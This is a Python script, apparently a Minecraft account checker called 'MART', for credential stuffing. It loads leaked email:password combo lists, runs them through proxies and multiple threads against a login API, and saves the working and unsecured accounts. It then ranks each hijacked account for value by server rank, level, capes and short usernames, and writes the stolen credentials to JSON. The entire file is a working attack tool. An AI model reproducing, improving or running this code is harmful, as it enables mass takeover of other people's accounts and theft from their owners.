from stuff.cape_checker import *
from stuff.checker import *
from stuff.config_reader import *
from stuff.file_creator import *
from stuff.special_checker import *
import codecs

windows = False #define so doesn't error (line 203) if not windows.
test = codecs.encode("test")
yourversion = "1.2.4"
unix = str(int(time.time()))
if platform.system() == "Windows":
    import ctypes
    windows = True
    ctypes.windll.kernel32.SetConsoleTitleW("MART by scorpion3013 | version " + yourversion)
else:
    print("Oh, You are not on Windows -> Turning off title bar status changer")

print("Contact: www.scorpion3013.xyz")
time.sleep(5)
gitversion = requests.get(url="https://raw.githubusercontent.com/scorpion3013/minecraft-account-recovery-tool/master/stuff/version.txt").content.decode().replace("\n","")

try:
    if gitversion != yourversion:
        print("Your version is outdated.")
        print("Your version: " + yourversion.replace("\n", ""))
        print("Latest version: " + gitversion.replace("\n", ""))
        print("https://github.com/scorpion3013/minecraft-account-recovery-tool/releases")
        print("Starting anyways in 10 seconds")
        time.sleep(10)
except:
    pass




from stuff import checker
create_files()
account_file_lines = open(BASIC_PATH + os.sep + 'accounts.txt', encoding="utf8", errors='ignore').read().split('\n')
threads = Checker.Threads.thread_amount

class Counter:
    valid = 0
    invalid = 0
    insecure = 0
    minecon = 0
    fivezig = 0
    optifine = 0
    labymod = 0
    liquidbounce = 0
    hypixelrank = 0
    hypixellevel = 0
    shortname = 0
    mineplexrank = 0
    mineplexlevel = 0
    hivemcrank = 0

checker.proxy_getter()


result = {}

def check(x):
    if account_file_lines[x].__contains__(':'):
        email_username = account_file_lines[x].split(':', 1)[0]
        password = account_file_lines[x].split(':', 1)[1]
        check_counter = 0
        answer = 'Invalid credentials'
        while True:
            if check_counter != Checker.check_amount:
                answer = account_login(email_username=email_username, password=password)
                if "errorMessage" in answer:
                    check_counter += 1
                else:
                    break
                    #account was valid
            else:
                break

        if str(answer).__contains__("name") and str(answer.__contains__("availableProfiles")):
            try:
                uuid = answer["availableProfiles"][0]["id"]
                username = answer["availableProfiles"][0]["name"]
                open(FOLDER_PATH + os.sep + 'working' + unix + '.txt', 'a').write(account_file_lines[x] + "\n")
                Counter.valid += 1
                cprint("Valid account " + username, "green")
                result[account_file_lines[x]] = {}

                result[account_file_lines[x]]["username"] = username
                result[account_file_lines[x]]["email"] = email_username
                result[account_file_lines[x]]["password"] = password
                result[account_file_lines[x]]["rank"] = {}
                result[account_file_lines[x]]["level"] = {}
                result[account_file_lines[x]]["cape"] = {}

                try:
                    if bool(answer["user"]["secured"]) is False:
                        open(FOLDER_PATH + os.sep + 'unsecure' + unix + '.txt', 'a').write(account_file_lines[x] + "\n")
                        result[account_file_lines[x]]["unsecure"] = True
                        Counter.insecure += 1
                except:
                    pass
                try:
                    if under_four_character_long(username) is True:
                        open(FOLDER_PATH + os.sep + 'special_name' + unix + '.txt', 'a').write(account_file_lines[x] + " Name: " + username + "\n")
                        result[account_file_lines[x]]["specialname"] = True
                        Counter.shortname += 1
                    if Checker.Level.hypixel_level or Checker.Rank.hypixel_rank:
                        if Checker.Hypixel.method == 0:
                            hp = hypixel_check_api(username)
                        else:
                            hp = hypixel_check_plank(username)

                        if Checker.Rank.hypixel_rank:
                            if hp[0] != 'False':
                                open(FOLDER_PATH + os.sep + 'hypixelRank' + unix + '.txt', 'a').write(
                                    account_file_lines[x] + ' Rank: ' + hp[0] + "\n")
                                result[account_file_lines[x]]["rank"]["hypixel"] = hp[0]
                                Counter.hypixelrank += 1
                        if Checker.Level.hypixel_level:
                            if int(hp[1]) != 0:
                                if hp[1] >= Checker.Level.hypixel_min_level:
                                    open(FOLDER_PATH + os.sep + 'hypixelLevel' + unix + '.txt', 'a').write(
                                        account_file_lines[x] + ' Level: ' + str(hp[1]) + "\n")
                                    Counter.hypixellevel += 1
                                result[account_file_lines[x]]["level"]["hypixel"] = hp[1]

                    if Checker.Level.mineplex_level or Checker.Rank.mineplex_rank:
                        mp = mineplex_check(username)

                        if Checker.Rank.mineplex_rank:
                            if ((mp[0]) != 'False'):
                                open(FOLDER_PATH + os.sep + 'mineplexRank' + unix + '.txt', 'a').write(
                                    account_file_lines[x] + ' Rank: ' + (mp[0]) + "\n")
                                result[account_file_lines[x]]["rank"]["mineplex"] = (mp[0])
                                Counter.mineplexrank += 1
                        if Checker.Level.mineplex_level:
                            if int(mp[1]) != 0:
                                if int(mp[1]) >= Checker.Level.mineplex_min_level:
                                    open(FOLDER_PATH + os.sep + 'mineplexLevel' + unix + '.txt', 'a').write(
                                        account_file_lines[x] + ' Level: ' + str(mp[1]) + "\n")
                                    Counter.mineplexlevel += 1
                                result[account_file_lines[x]]["level"]["mineplex"] = int(mp[1])

                    if Checker.Rank.hivemc_rank:
                        hivemc_rank = hivemc_rank_check(username)
                        if hivemc_rank is not False:
                            open(FOLDER_PATH + os.sep + 'hivemcrank' + unix + '.txt', 'a').write(
                                account_file_lines[x] + ' Rank: ' + str(hivemc_rank) + "\n")
                            result[account_file_lines[x]]["rank"]["hive"] = hivemc_rank
                            Counter.hivemcrank += 1

                    if Checker.Cape.minecon:
                        if minecon_cape_request(uuid) is True:
                            open(FOLDER_PATH + os.sep + 'minecon' + unix + '.txt', 'a').write(account_file_lines[x] + "\n")
                            result[account_file_lines[x]]["mineconcape"] = True
                            Counter.minecon += 1
                    if Checker.Cape.fivezig:
                        if five_zig_cape_request(uuid) is True:
                            open(FOLDER_PATH + os.sep + '5zig' + unix + '.txt', 'a').write(account_file_lines[x] + "\n")
                            result[account_file_lines[x]]["fivesigcape"] = True
                            Counter.fivezig += 1
                    if Checker.Cape.optifine:
                        if optifine_cape_request(username) is True:
                            open(FOLDER_PATH + os.sep + 'optifine' + unix + '.txt', 'a').write(account_file_lines[x] + "\n")
                            result[account_file_lines[x]]["optifinecape"] = True
                            Counter.optifine += 1
                    if Checker.Cape.labymod:
                        if laby_mod_cape_request(uuid) is True:
                            open(FOLDER_PATH + os.sep + 'labymod' + unix + '.txt', 'a').write(account_file_lines[x] + "\n")
                            result[account_file_lines[x]]["labymodcape"] = True
                            Counter.labymod += 1
                    if Checker.Cape.liquidbounce:
                        if liquidbounce_cape_request(uuid) is True:
                            open(FOLDER_PATH + os.sep + 'liquidbounce' + unix + '.txt', 'a').write(account_file_lines[x] + "\n")
                            result[account_file_lines[x]]["liquidbouncecape"] = True
                            Counter.liquidbounce += 1
                    if Checker.NameMC.searches:
                        searches = namemc_searches(username)
                        if searches is not False:
                            open(FOLDER_PATH + os.sep + 'namemc' + unix + '.txt', 'a').write(
                                account_file_lines[x] + ' Searches: ' + str(searches) + "\n")
                            result[account_file_lines[x]]["namemc"]["searches"] = searches
                except:
                    pass
            except Exception as e:
                if Checker.debug:
                    print("ERROR")
                    print(json.dumps(answer, sort_keys=False, indent=4))
                    print(account_file_lines[x])
                    print(e)
                Counter.invalid += 1
        else:
            if Checker.debug:
                print("ELSE")
                print(json.dumps(answer, sort_keys=False, indent=4))
                print(account_file_lines[x])
            #cprint('Invalid account', "red")
            Counter.invalid += 1
    else:
        print("INVALID COMBO")
        Counter.invalid += 1
    if windows:
        ctypes.windll.kernel32.SetConsoleTitleW(
            "MART by scorpion3013 | " +
            "Combos left: " + str(len(account_file_lines) - (Counter.valid + Counter.invalid)) +
            " | Working: " + str(Counter.valid) +
            " | Bad: " + str(Counter.invalid))  # + " | Proxies alive: " + str(len(checker.proxy.working)))


def theads_two(numbers, threads=7):
    pool = ThreadPool(threads)
    results = pool.map(check, numbers)
    pool.close()
    pool.join()
    return results


if __name__ == "__main__":
    countt = []
    for x in range(len(account_file_lines)):
        countt.append(int(x))

    threads_one = theads_two(countt, threads)

Counter_list = [str(Counter.valid) + ' Valid accounts',
                str(Counter.invalid) + ' Invalid accounts',
             str(Counter.insecure) + ' Unsecure accounts',
                str(Counter.minecon) + ' Minecon-capes',
             str(Counter.fivezig) + ' 5zig-capes',
                str(Counter.optifine) + ' Optifine-capes',
             str(Counter.labymod) + ' Labymod-capes',
                str(Counter.liquidbounce) + ' LiquidBounce-capes',
             str(Counter.hypixelrank) + ' Hypixel-Rank accounts',
                str(Counter.hypixellevel) + ' Hypixel-Level accounts',
             str(Counter.mineplexrank) + ' Mineplex-Rank accounts',
                str(Counter.mineplexlevel) + ' Mineplex-Level accounts',
                str(Counter.hivemcrank) + ' Hivemc-rank accounts',
                str(Counter.shortname) + ' Short-name accounts']

json_data = json.dumps(result, sort_keys=False, indent=4)
open(FOLDER_PATH + os.sep + 'accounts.json', 'a').write(json_data)
print('\nResult:\n')

for x in range(len(Counter_list) - 0):
    print(Counter_list[x])

print('Finished')
input()